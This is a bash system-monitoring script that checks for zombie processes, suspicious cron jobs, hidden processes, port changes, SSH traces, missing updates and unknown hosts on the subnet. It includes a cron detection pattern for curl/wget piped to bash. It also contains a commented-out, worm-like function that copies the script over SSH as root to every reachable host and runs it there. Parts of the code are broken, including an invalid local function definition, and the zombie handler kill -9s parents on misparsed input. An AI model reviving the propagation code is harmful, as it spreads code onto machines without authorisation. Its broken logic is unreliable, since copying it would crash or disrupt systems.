#!/bin/bash
# exec 2> /dev/null
set -euo pipefail

#==================== Initialization of variables ====================
readonly LOG_FILE="/var/log/listen_watch.log"
readonly ALARM_LOG="/var/log/alarm_$(date +%Y%m%d_%H%M%S).log"
readonly STATE_DIR="/var/lib/listen_watch"
readonly STATE_FILE="$STATE_DIR/ports.txt"
readonly PROPAGATE_LOG="/var/log/propagate.log"
readonly ALREADY_RUN_FILE="$STATE_DIR/already_run_hosts.txt" 
readonly MAX_CRON_TIME=1800
readonly max_cpu=80
readonly max_ram=80
readonly ex_cpu=95
readonly ex_mem=95

RED='\033[31m'
ORANGE='\033[38;5;208m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
NC='\033[0m'

mkdir -p "$STATE_DIR"
KERNEL_VER=$(uname -r)
MODULES_DIR="/lib/modules/$KERNEL_VER"

# ==================== Network Audit variables ====================
SNMP_COMMUNITY="${SNMP_COMMUNITY:-public}"
NETWORK_SUBNET="${NETWORK_SUBNET:-192.168.1.0/24}" # [!] CHANGE IF YOU HAVE ANOTHER
TRUSTED_HOSTS_FILE="${TRUSTED_HOSTS_FILE:-/etc/trusted_hosts}"

# ==================== Requirements ====================
required_tools=("top" "ps" "grep" "lsof" "ss" "ip" "route" "nmap" "arp-scan" "snmpget" "snmpwalk" "sensors" "lsb_release")
for cmd in "${required_tools[@]}"; do
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${RED} Error: $cmd is not installed ${NC}"
        exit 1
    fi
done

# ==================== Initialization of functions ====================
rtcheck() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED} NEED ROOT LOGIN! ERROR 0x28000 ${NC}" >&2
        exit 1
    fi
}

display() {
    clear
    local script_dir
    script_dir="$(dirname "$0")"
    if [ -f "$script_dir/eye.txt" ]; then
        cat "$script_dir/eye.txt"
    else
        echo -e "${ORANGE} Eye file not found, skipping. ${NC}"
    fi
    sleep 3 
    clear
}

show_instruction() {
    echo -e "${WHITE} [z] - check up for zombie processes ${NC}"
    echo -e "${WHITE} [c] - check up for anomalies in cron tasks ${NC}"
    echo -e "${WHITE} [p] - check up for strange/unusual processes ${NC}"
    echo -e "${WHITE} [n] - check up for network anomalies ${NC}"
    echo -e "${WHITE} [s] - check up for strange ssh events ${NC}"
    echo -e "${WHITE} [u] - check up for critical updates ${NC}"
    echo -e "${WHITE} [r] - check up for no-root commands ${NC}"
    echo -e "${WHITE} [a] - check up for illegal hosts in subnet ${NC}"
    echo -e "${WHITE} [t] - check up system temperature ${NC}"
    echo -e "${WHITE} [k] - check up kernel modules ${NC}"
    echo -e "${WHITE} [h] - help ${NC}"
}

zmbkiller() {
    echo -e "${WHITE} === Checking for zombie processes === ${NC}"
    # More reliable zombie detection across different ps versions
    zombies=$(ps -eo pid,stat,ppid,comm | awk '$2 ~ /^Z/ {print $1, $3, $4}')
    if [ -n "$zombies" ]; then
      for zombie in $zombies; do
            parent_pid=$(ps -o ppid= -p "$zombie" 2>/dev/null | tr -d ' ')
            if [ -n "$parent_pid" ] && [ "$parent_pid" -ne 1 ]; then
                echo "Killing parent process $parent_pid of zombie $zombie"
                kill -9 "$parent_pid" 2>/dev/null
            else
                echo "${YELLOW} Cannot kill zombie $zombie (parent is init or not found) ${NC}"
            fi
        done
    else
        echo -e "${GREEN} No zombie processes found. ${NC}"
    fi
}

chkcron() {
    echo -e "${WHITE} === Checking up for frozen cron tasks === ${NC}"
    local found=0
    while read -r pid ppid etime cmd; do
        local total=0
        if [[ "$ppid" -eq 1 ]] && echo "$cmd" | grep -q cron; then
            continue
        fi
        if echo "$cmd" | grep -qE '/etc/cron|CRON'; then
            if [[ "$etime" =~ ^([0-9]+)-([0-9]{2}):([0-9]{2}):([0-9]{2})$ ]]; then
                total=$(( ${BASH_REMATCH[1]}*86400 + ${BASH_REMATCH[2]}*3600 + ${BASH_REMATCH[3]}*60 + ${BASH_REMATCH[4]} ))
            elif [[ "$etime" =~ ^([0-9]{2}):([0-9]{2}):([0-9]{2})$ ]]; then
                total=$(( ${BASH_REMATCH[1]}*3600 + ${BASH_REMATCH[2]}*60 + ${BASH_REMATCH[3]} ))
            elif [[ "$etime" =~ ^([0-9]+):([0-9]{2})$ ]]; then
                total=$(( ${BASH_REMATCH[1]}*60 + ${BASH_REMATCH[2]} ))
            elif [[ "$etime" =~ ^([0-9]+)$ ]]; then
                total="${BASH_REMATCH[1]}"
            fi
            
            if (( total > MAX_CRON_TIME )); then
                echo -e "${YELLOW} Frozen task: PID=$pid, running for ${total}s | Cmd: $cmd ${NC}"
                found=1
            fi
        fi
    done < <(ps -eo pid,ppid,etime,args --no-headers 2>/dev/null || true)

    if [ $found -eq 0 ]; then
        echo -e "${GREEN} No frozen cron tasks found. ${NC}"
    fi

    echo -e "${WHITE} === Checking for anomalous/unusual crontasks (perhaps rootkits) === ${NC}"
    while IFS=: read -r user _; do
        echo -e "${CYAN} ••• $user ••• ${NC}"
        crontab -u "$user" -l 2>/dev/null | grep -E 'bash.*curl|bash.*wget' || true
    done < /etc/passwd
}

nmpproc() {
    echo -e "${WHITE} === Searching anomaly processes === ${NC}"
    sleep 1
    echo -e "${WHITE} Comparing /proc and ps outputs ${NC}"
    local ps_pids proc_pids hidden_pids
    ps_pids=$(ps -e -o pid= 2>/dev/null | sort -n)
    proc_pids=$(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n)
    hidden_pids=$(comm -23 <(echo "$proc_pids") <(echo "$ps_pids") 2>/dev/null || true)
    
    if [ -n "$hidden_pids" ]; then
        echo -e "${ORANGE} Strange hidden PIDS: ${NC}"
        for pid in $hidden_pids; do
            if [ -d "/proc/$pid" ]; then
                ls -l "/proc/$pid/exe" 2>/dev/null || true
                cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ' || true
                echo
            fi
        done
    fi

    echo -e "${WHITE} === Checking for processes with changed OOM score === ${NC}"
    for f in /proc/[0-9]*/oom_score_adj; do
        value=$(cat "$f" 2>/dev/null || true)
        if [ "$value" != "0" ] && [ -n "$value" ]; then
            local pid=${f#/proc/}
            pid=${pid%/oom_score_adj}
            echo -e "${YELLOW} PID $pid: OOM score adjusted to $value ${NC}"
        fi
    done

    echo -e "${WHITE} Processes in temporary directories: ${NC}"
    ps axeo pid,comm,args 2>/dev/null | grep -E '/(tmp|dev|run)/' | grep -v grep || true

    echo -e "${WHITE} Unnamed processes: ${NC}"
    ps axeo pid,comm 2>/dev/null | awk '$2 == "[]" || $2 == ""' || true

    echo -e "${WHITE} Non-typical incoming connections: ${NC}"
    lsof -i -nP 2>/dev/null | grep LISTEN | grep -Ev ':(22|80|443)' | grep -v "COMMAND" || true

    echo -e "${WHITE} === Checking for high resource usage === ${NC}"
    local high_cpu_proc high_ram_proc
    high_cpu_proc=$(ps -eo pid,pcpu,comm --no-headers 2>/dev/null | awk -v tresh="$max_cpu" '$2+0 >= tresh {print $1}' || true)
    high_ram_proc=$(ps -eo pid,pmem,comm --no-headers 2>/dev/null | awk -v tresh="$max_ram" '$2+0 >= tresh {print $1}' || true)

    if [ -n "$high_cpu_proc" ] || [ -n "$high_ram_proc" ]; then
        echo -e "${ORANGE} [!] Warning! Overloading is detected. ${NC}"
        local all_procs
        all_procs=$(echo "$high_cpu_proc $high_ram_proc" | tr ' ' '\n' | sort -u)
        for pid in $all_procs; do
            if ps -p "$pid" >/dev/null 2>&1; then
                if [ "$pid" -eq 1 ] || [ "$pid" -eq 2 ] || [ "$pid" -eq $$ ]; then
                    echo -e "${YELLOW} Skipping system/self process $pid ${NC}"
                    continue
                fi
                echo -e "${YELLOW} Lowering priority (renice) for process $pid ${NC}"
                renice 15 -p "$pid" 2>/dev/null || echo -e "${RED} Failed to renice process $pid ${NC}"
            fi
        done
        echo -e "${RED} [!] SAFE MODE: Auto-termination (kill) is DISABLED. Investigate manually. ${NC}"
    else
        echo -e "${GREEN} Overloading is not detected. ${NC}"
    fi
}

ntwcheck() {
    echo -e "${WHITE} === Checking up listening ports === ${NC}" | tee -a "$LOG_FILE"
    local CURR
    CURR=$(mktemp)
    ss -tulpn 2>/dev/null | awk 'NR>1 {print $1, $5}' | sort -u > "$CURR"
    
    if [ ! -f "$STATE_FILE" ]; then
        cp "$CURR" "$STATE_FILE"
        echo -e "${BLUE} Base of listening ports is created. ${NC}" | tee -a "$LOG_FILE"
        rm -f "$CURR"
        return 0
    fi

    local ADDED REMOVED
    ADDED=$(comm -13 "$STATE_FILE" "$CURR" 2>/dev/null || true)
    REMOVED=$(comm -23 "$STATE_FILE" "$CURR" 2>/dev/null || true)

    [ -n "$ADDED" ] && echo -e "${YELLOW} New ports: ${NC}" | tee -a "$LOG_FILE" && echo "$ADDED" | tee -a "$LOG_FILE"
    [ -n "$REMOVED" ] && echo -e "${YELLOW} Closed ports: ${NC}" | tee -a "$LOG_FILE" && echo "$REMOVED" | tee -a "$LOG_FILE"
    [ -z "${ADDED}${REMOVED}" ] && echo -e "${GREEN} Nothing changed. ${NC}" | tee -a "$LOG_FILE"

    cp "$CURR" "$STATE_FILE"
    rm -f "$CURR"
}

sshcheck() {
    echo -e "${WHITE} === Checking up for strange things with SSH === ${NC}"
    sleep 1
    {
        date
        timedatectl 2>/dev/null || echo -e "${RED} timedatectl not available ${NC}"
        echo -e "${WHITE} --- w --- ${NC}"; w 2>/dev/null || true
        echo -e "${WHITE} --- who --- ${NC}"; who 2>/dev/null || true
        echo -e "${WHITE} --- ps auxww --- ${NC}"; ps auxww 2>/dev/null || true
        echo -e "${WHITE} --- ss -tulpn --- ${NC}"; ss -tulpn 2>/dev/null || true
        echo -e "${WHITE} --- /etc/passwd --- ${NC}"; cat /etc/passwd 2>/dev/null || true
        echo -e "${WHITE} --- lastlog --- ${NC}"; lastlog 2>/dev/null || true
        echo -e "${WHITE} --- last -f /var/log/wtmp --- ${NC}"; last -f /var/log/wtmp 2>/dev/null || true
        echo -e "${WHITE} --- last -f /var/log/btmp --- ${NC}"; last -f /var/log/btmp 2>/dev/null || true
        echo -e "${WHITE} --- find /bin /sbin -type f -mtime -1 --- ${NC}"; find /bin /sbin -type f -mtime -1 2>/dev/null || true
        echo -e "${WHITE} --- find authorized_keys --- ${NC}"; find /root /home -name "authorized_keys" 2>/dev/null || true
        echo -e "${WHITE} --- tail -100 /var/log/auth.log --- ${NC}"; tail -100 /var/log/auth.log 2>/dev/null || true
        echo -e "${WHITE} --- journalctl --lines=50 --- ${NC}"; journalctl -xe --lines=50 2>/dev/null || true
        echo -e "${WHITE} --- ip route show --- ${NC}"; ip route show 2>/dev/null || true
        echo -e "${WHITE} --- ip neigh --- ${NC}"; ip neigh 2>/dev/null || true
    } > "$ALARM_LOG" 2>&1

    echo -e "${GREEN} SSH check log saved to $ALARM_LOG ${NC}"
}

pkgcheck() {
    echo -e "${WHITE} === Checking up for missed security updates === ${NC}"
    local LOG="/var/log/critical-updates.log"
    local critical_pkgs=""
    if ! command -v debsecan >/dev/null 2>&1; then
        echo -e "${YELLOW} debsecan not installed, skipping critical CVE check. ${NC}"
        return 0
    fi

    local updates
    updates=$(apt list --upgradable 2>/dev/null | grep -v "Listing" | cut -d/ -f1 || true)
    for pkg in $updates; do
        local cve_count
        cve_count=$(debsecan --suite "$(lsb_release -sc 2>/dev/null)" --only-fixed --package "$pkg" 2>/dev/null | grep -c -E '\([7-9]\.[0-9]|10\.0\)' || true)
        if [[ "$cve_count" -gt 0 ]]; then
            critical_pkgs="${critical_pkgs}\n- $pkg (fixes $cve_count critical CVEs)"
        fi
    done

    if [ -n "$critical_pkgs" ]; then
        echo -e "${ORANGE} Critical security notifications:\n$critical_pkgs ${NC}"
        if command -v notify-send >/dev/null 2>&1; then
            notify-send -u critical -t 0 "Обновления безопасности" "$critical_pkgs" || true
        fi
        echo "$(date): Найдены критические обновления: $critical_pkgs" >> "$LOG"
    else
        echo -e "${GREEN} No critical updates found. ${NC}"
    fi
}

npswdcheck() {
    echo -e "${WHITE} === Checking up for NOPASSWD-commands === ${NC}"
    sudo -l 2>/dev/null | grep NOPASSWD || echo -e "${GREEN} No NOPASSWD entries found. ${NC}"
}

discover_hosts(){
    local subnet="${1:-$NETWORK_SUBNET}"
    local tmp_file="/tmp/hosts_$$.txt"
    rm -f "$tmp_file"
    echo -e "${BLUE} Scanning network for alive hosts... ${NC}"
    nmap -sn "$subnet" -oG - 2>/dev/null | awk '/Up$/{print $2}' >> "$tmp_file" || true
    arp-scan --local --quiet 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+' | awk '{print $1}' >> "$tmp_file" || true
    sort -u "$tmp_file" -o "$tmp_file"
    sed -i '/^$/d' "$tmp_file"
    cat "$tmp_file"
    rm -f "$tmp_file"
}

snmp_get_info(){
    local ip=$1
    local community="${SNMP_COMMUNITY:-public}"
    local sysdesc="" hostname="" uptime_human="N/A"
    
    sysdesc=$(snmpget -v2c -c "$community" -t 2 "$ip" 1.3.6.1.2.1.1.1.0 2>/dev/null | cut -d= -f2- | xargs || true)
    hostname=$(snmpget -v2c -c "$community" -t 2 "$ip" 1.3.6.1.2.1.1.5.0 2>/dev/null | cut -d= -f2- | xargs || true)
    
    local uptime_raw
    uptime_raw=$(snmpget -v2c -c "$community" -t 2 "$ip" 1.3.6.1.2.1.1.3.0 2>/dev/null | awk '{print $NF}' || true)
    if [[ -n "$uptime_raw" && "$uptime_raw" =~ ^[0-9]+$ ]]; then
        local uptime_sec=$((uptime_raw / 100))
        # FIXED: Correct math for hours, minutes, seconds
        local days=$((uptime_sec / 86400))
        local hours=$(( (uptime_sec % 86400) / 3600 ))
        local mins=$(( (uptime_sec % 3600) / 60 ))
        local secs=$((uptime_sec % 60))
        uptime_human=$(printf "%d days, %02d:%02d:%02d" "$days" "$hours" "$mins" "$secs")
    fi
    echo "IP: $ip | Hostname: ${hostname:-N/A} | Uptime: $uptime_human | OS: ${sysdesc:-N/A}"
}

check_illegal(){
    local ip="$1" mac="$2" hostname="$3"
    if [ ! -f "$TRUSTED_HOSTS_FILE" ]; then
        echo -e "${RED} White-list of hosts does not exist. ${NC}"
        return 0
    fi
    if grep -qi -E "^$ip$|^$mac$|^$hostname$" "$TRUSTED_HOSTS_FILE" 2>/dev/null; then
        return 0
    else 
        return 1
    fi
}

ntwaudit(){
    echo -e "${WHITE} === Searching illegal hosts === ${NC}" | tee -a "$LOG_FILE"
    local hosts_file="/tmp/live_hosts_$$.txt"
    local illegal_log="/var/log/illegal_hosts.log"
    
    if [ ! -f "$TRUSTED_HOSTS_FILE" ]; then
        echo -e "${BLUE} Creating empty trusted hosts file: $TRUSTED_HOSTS_FILE. Add trusted hosts (IP, MAC, hostname) there, one per line. ${NC}" | tee -a "$LOG_FILE"
        touch "$TRUSTED_HOSTS_FILE"
    fi
    
    discover_hosts "$NETWORK_SUBNET" > "$hosts_file"
    local total_hosts
    total_hosts=$(wc -l < "$hosts_file" | tr -d ' ')
    echo -e "${BLUE} Found alive hosts: $total_hosts ${NC}" | tee -a "$LOG_FILE"
    
    if [ "$total_hosts" -eq 0 ]; then
        echo -e "${YELLOW} No alive hosts found. ${NC}"
        rm -f "$hosts_file"
        return 0
    fi
    
    local illegal_found=0
    while read -r ip; do
        [ -z "$ip" ] && continue
        local mac snmp_info hostname
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '{print $5}' || true)
        snmp_info=$(snmp_get_info "$ip")
        hostname=$(echo "$snmp_info" | grep -oP 'Hostname: \K[^ ]+' | head -1 || true)
        hostname="${hostname:-unknown}"
        
        if check_illegal "$ip" "$mac" "$hostname"; then
            echo -e "${GREEN} $ip ($hostname) - LEGAL ${NC}"
        else
            echo -e "${RED} $ip ($hostname) - ILLEGAL ${NC}"
            illegal_found=1
            echo "Getting info from $ip" | tee -a "$LOG_FILE"
            snmpwalk -v2c -c "$SNMP_COMMUNITY" "$ip" 1.3.6.1.2.1.25.4.2.1.2 > "/tmp/snmp_procs_${ip}.txt" 2>/dev/null || true
            snmpwalk -v2c -c "$SNMP_COMMUNITY" "$ip" 1.3.6.1.4.1.2021.8 > "/tmp/snmp_users_${ip}.txt" 2>/dev/null || true
            echo -e "${GREEN} Saved in /tmp/snmp_*_$ip.txt ${NC}" | tee -a "$LOG_FILE"
        fi
    done < "$hosts_file"
    
    rm -f "$hosts_file"
    if [ "$illegal_found" -eq 0 ]; then
        echo -e "${GREEN} No illegal hosts found. ${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${RED} [!] Founded illegal hosts! Check up the logs: $illegal_log ${NC}" | tee -a "$LOG_FILE"
    fi
}

# ==============================================================================
# [!] WARNING: PROPAGATION FUNCTION (WAMU)
# This function scans the network and copies/executes itself on other hosts.
# This behavior is identical to worms/botnets and will trigger IDS/IPS alerts.
# It is kept commented out for educational/authorized red-team purposes ONLY.
# DO NOT UNCOMMENT unless you have explicit written authorization.
# ==============================================================================
# wamu() {
#     echo -e "${WHITE}=== Starting propagation to other hosts ===${NC}" | tee -a "$PROPAGATE_LOG"
#     local hosts_file="/tmp/live_hosts_prop.txt"
#     discover_hosts "$NETWORK_SUBNET" > "$hosts_file"
#     local total=$(wc -l < "$hosts_file" | tr -d ' ')
#     echo -e "${BLUE} Found $total alive hosts ${NC}" | tee -a "$PROPAGATE_LOG"
# 
#     touch "$ALREADY_RUN_FILE"
#     local SCRIPT_PATH=$(realpath "$0")
#     local SCRIPT_NAME=$(basename "$SCRIPT_PATH")
#     local SSH_USER="${SSH_USER:-root}"
#     local SSH_KEY="${SSH_KEY:-~/.ssh/id_rsa}"
# 
#     while read -r ip; do
#         [[ "$ip" == "$(hostname -I | awk '{print $1}')" ]] && continue
#         grep -qx "$ip" "$ALREADY_RUN_FILE" && continue
# 
#         local ssh_cmd="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5"
#         [[ -n "$SSH_KEY" && -f "$SSH_KEY" ]] && ssh_cmd="$ssh_cmd -i $SSH_KEY"
# 
#         if ! $ssh_cmd "$SSH_USER@$ip" "echo OK" 2>/dev/null | grep -q "OK"; then
#             continue
#         fi
# 
#         scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${SSH_KEY:+-i $SSH_KEY}" "$SCRIPT_PATH" "$SSH_USER@$ip:/tmp/$SCRIPT_NAME" 2>/dev/null || continue
#         $ssh_cmd "$SSH_USER@$ip" "sudo /tmp/$SCRIPT_NAME $*" &
#         echo "$ip" >> "$ALREADY_RUN_FILE"
#     done < "$hosts_file"
#     rm -f "$hosts_file"
# }

tempchck() {
    echo -e "${WHITE} === System Temperature === ${NC}"
    sensors 2>/dev/null || echo -e "${YELLOW} No sensors found or not configured. ${NC}"
}

krnmdlchck() {
    echo -e "${WHITE} === Checking Kernel Modules === ${NC}"
    local check_module_path() {
        local modname="$1"
        if find "$MODULES_DIR" -name "$modname.ko*" -print -quit 2>/dev/null | grep -q .; then
            return 0
        else
            return 1
        fi
    }

    local check_signature() {
        local modname="$1"
        local sig
        sig=$(modinfo -F signature "$modname" 2>/dev/null || true)
        if [[ -n "$sig" && "$sig" != "unsigned" ]]; then
            echo -e "${GREEN} Signature verified ${NC}"
        else
            echo -e "${YELLOW} Signature unverified or unsigned ${NC}"
        fi
    }

    while read -r modname _; do
        echo -e "${CYAN} Module: $modname ${NC}"
        if check_module_path "$modname"; then
            echo -e "${GREEN} File: Found ${NC}"
        else
            echo -e "${YELLOW} File: Does not exist in $MODULES_DIR ${NC}"
        fi
        check_signature "$modname"
        local mod_path
        mod_path=$(modinfo -F filename "$modname" 2>/dev/null || true)
        if [[ -n "$mod_path" && "$mod_path" != "$MODULES_DIR"* ]]; then
            echo -e "${ORANGE} Unusual loading path: $mod_path ${NC}"
        fi
    done < /proc/modules
}

# ==================== Main code ====================
run_zmbkiller=0; run_chkcron=0; run_nmpproc=0; run_ntwcheck=0
run_sshcheck=0; run_pkgcheck=0; run_npswdcheck=0; run_ntwaudit=0
run_tempchck=0; run_krnmdlchck=0; run_show_instruction=0
run_all=1

while getopts "zcpnsurathk" opt; do
    case $opt in
        z) run_all=0; run_zmbkiller=1 ;;
        c) run_all=0; run_chkcron=1 ;;
        p) run_all=0; run_nmpproc=1 ;;
        n) run_all=0; run_ntwcheck=1 ;;
        s) run_all=0; run_sshcheck=1 ;;
        u) run_all=0; run_pkgcheck=1 ;;
        r) run_all=0; run_npswdcheck=1 ;;
        a) run_all=0; run_ntwaudit=1 ;;
        t) run_all=0; run_tempchck=1 ;;
        k) run_all=0; run_krnmdlchck=1 ;;
        h) run_all=0; run_show_instruction=1 ;;
        \?) echo -e "${RED} Unknown option! Check the README file. ${NC}" >&2; exit 1 ;;
    esac
done

if [ $run_all -eq 1 ]; then
    run_zmbkiller=1; run_chkcron=1; run_nmpproc=1; run_ntwcheck=1
    run_sshcheck=1; run_pkgcheck=1; run_npswdcheck=1; run_ntwaudit=1
    run_tempchck=1; run_krnmdlchck=1
fi

rtcheck
display
echo -e "${WHITE} === System Monitor Script started at $(date) === ${NC}"

[ $run_zmbkiller -eq 1 ] && zmbkiller
[ $run_chkcron -eq 1 ] && chkcron
[ $run_nmpproc -eq 1 ] && nmpproc
[ $run_ntwcheck -eq 1 ] && ntwcheck
[ $run_sshcheck -eq 1 ] && sshcheck
[ $run_pkgcheck -eq 1 ] && pkgcheck
[ $run_npswdcheck -eq 1 ] && npswdcheck
[ $run_ntwaudit -eq 1 ] && ntwaudit
[ $run_tempchck -eq 1 ] && tempchck
[ $run_krnmdlchck -eq 1 ] && krnmdlchck
[ $run_show_instruction -eq 1 ] && show_instruction

echo -e "${WHITE} === System Monitor Script finished at $(date) === ${NC}"
